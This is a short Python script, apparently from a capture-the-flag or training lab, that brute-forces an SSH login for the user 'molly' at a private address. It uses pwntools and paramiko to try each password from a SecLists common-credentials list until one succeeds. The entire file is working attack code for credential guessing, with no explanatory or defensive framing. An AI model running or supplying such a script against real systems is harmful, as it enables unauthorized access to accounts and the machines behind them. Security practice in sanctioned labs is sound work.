from pwn import *
import paramiko

host = "10.10.215.95"
username = "molly"
attempts = 0

with open("/usr/share/seclists/Passwords/Common-Credentials/best110.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=5)  # Increased timeout
            if response.connected():
                print("Valid Password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password")
        except ConnectionResetError:
            print("Connection was reset by the peer. Moving to next password.")
        attempts += 1
